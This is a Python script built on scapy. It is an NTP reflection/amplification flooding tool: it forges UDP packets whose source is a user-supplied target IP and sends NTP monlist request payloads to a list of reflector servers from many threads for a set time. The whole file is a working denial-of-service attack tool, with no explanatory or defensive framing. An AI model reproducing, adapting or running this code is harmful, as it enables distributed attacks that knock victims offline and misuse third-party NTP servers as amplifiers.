import time
import random
import threading
from scapy.all import *

ip = input("Target: ")
threads = int(input("Threads: "))
open_list = input("List: ")
timer = float(input("Time(S): "))

class main:
	def __init__(self, ip, threads, open_list, timer):
		self.ip = ip
		self.threads = threads
		self.open_list = open_list
		self.timer = timer
		
		self.mem_list = []
		
		self.payload = "\x17\x00\x03\x2a\x00\x00\x00\x00"
		
		self.timeout = time.time() + 1 * self.timer

		self.append_to()
		self.init_flood()
		self.wait()

	def append_to(self):
		with open(self.open_list, "r") as fd:
			lines = fd.readlines()
			for line in lines:
				self.mem_list.append(line.strip())

	def init_flood(self):
		for i in range(self.threads):
			threading.Thread(target=self.flood, daemon=True).start()

	def flood(self):
		while time.time() < self.timeout:
			port = random.randint(1, 65535)
			packet = IP(src=ip, dst=random.choice(self.mem_list))/UDP(sport=port, dport=123)/Raw(load=self.payload)
			send(packet, verbose=0)

	def wait(self):
		while time.time() < self.timeout:
			try:
				time.sleep(1)
			except KeyboardInterrupt:
				print("Quitting.")
				break

if __name__ == "__main__":
	main(ip, threads, open_list, timer)
